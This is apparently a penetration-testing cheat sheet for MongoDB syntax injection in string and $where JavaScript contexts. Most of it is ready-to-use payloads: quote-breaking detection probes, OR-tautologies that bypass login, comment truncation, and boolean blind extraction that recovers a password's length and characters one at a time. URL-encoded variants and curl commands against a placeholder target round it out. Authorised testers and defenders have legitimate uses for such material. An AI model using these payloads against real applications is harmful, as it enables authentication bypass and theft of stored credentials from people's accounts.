# MongoDB Syntax Injection (String Context)

## When this applies

- Application concatenates user input into a JSON-like query string before parsing it (rare but happens with hand-rolled drivers, custom serializers, or legacy code).
- User input lands inside a `$where` JavaScript predicate as part of a larger string.
- Common detection: a single `'` or `"` causes a parse/syntax error response.

## Technique

Break out of the string context, inject logical operators, and close cleanly. Mirrors classic SQLi syntax but uses JavaScript `||` / `&&` / `==` rather than SQL's `OR` / `AND` / `=`.

## Steps

### 1. Detection

Single character probes:

```
'
"
\
'+'
"+"
'||'
```

URL-parameter probes:

```
?category=test'
?category=test"
?category=test\
?category=test'%2b'
?category=test'%7c%7c'
```

Boolean probes (after confirming syntax break):

```
test' && '1'=='1
test' && '1'=='2
test'||1||'
test'&&0&&'
```

If `'1'=='1'` returns "found" content but `'1'=='2'` returns "not found", you have a boolean oracle in a JavaScript context.

### 2. OR-tautology to bypass auth

```
admin' || '1'=='1
admin' || 1==1 || '
' || 1==1 || '
' || true || '
```

Closing pattern: open quote, add OR true, close any trailing quote with `|| '`.

### 3. Comment-style truncation (varies by driver)

```
admin'--
admin'#
admin'//
admin'/*
```

`//` is JavaScript single-line comment — works inside `$where` predicates.

### 4. Boolean blind extraction (length)

```javascript
admin' && this.password.length == 8 || 'a'=='b
admin' && this.password.length < 30 || 'a'=='b
admin' && this.password.length > 5 || 'a'=='b
```

### 5. Boolean blind extraction (chars)

```javascript
admin' && this.password[0]=='a' || 'a'=='b
admin' && this.password.charAt(0)=='a' || 'a'=='b
admin' && this.password.substring(0,1)=='a' || 'a'=='b
admin' && /^a/.test(this.password) || 'a'=='b
admin' && this.password.charCodeAt(0)==97 || 'a'=='b
```

The trailing `|| 'a'=='b` is mandatory: it provides a safe-syntax false expression that closes the surrounding quote without leaking a leftover `'`.

### 6. URL-encoded payloads (when special chars are filtered)

| Char | Encoded |
|---|---|
| `'` | `%27` |
| `"` | `%22` |
| `&` | `%26` |
| `\|` | `%7c` |
| `=` | `%3d` |

```
admin'%20%26%26%20'1'%3d%3d'1     # admin' && '1'=='1
admin'%7c%7c1%7c%7c'              # admin'||1||'
```

### 7. cURL examples

```bash
curl "http://target/filter?category=Gifts'"
curl "http://target/filter?category=Gifts'%7c%7c1%7c%7c'"
curl "http://target/lookup?user=admin'%26%26'1'%3d%3d'1"
```

## Verifying success

- Single `'` produces a 500 / SyntaxError response (`SyntaxError: unterminated string literal` is a strong signal).
- Tautology returns expected "logged in" response without valid creds.
- Boolean payload `1==1` produces "true" output, `1==2` produces "false" output (two distinguishable states).
- Char-by-char extraction yields a credential that authenticates against the legitimate login.

## Common pitfalls

- Modern Mongoose/Node drivers REJECT raw string queries — most modern apps use object queries, making syntax injection rare. Operator injection is more common.
- `mongo-sanitize` removes keys starting with `$` but doesn't touch string content — syntax injection still works on filtered apps.
- `$where` evaluation may be disabled (`security.javascriptEnabled: false` in MongoDB ≥ 4.4) — payloads that depend on JS execution silently fail.
- Some drivers escape `'` automatically — try `\\'` or unicode-escape sequences (`'`).
- The trailing `|| 'a'=='b` clause is critical: omitting it leaves an unbalanced quote and crashes the parser.

## Tools

- Burp Repeater (manual probing).
- NoSQLMap (`-u <url> --inject-string`).
- Custom Python with `requests` + binary-search extraction.
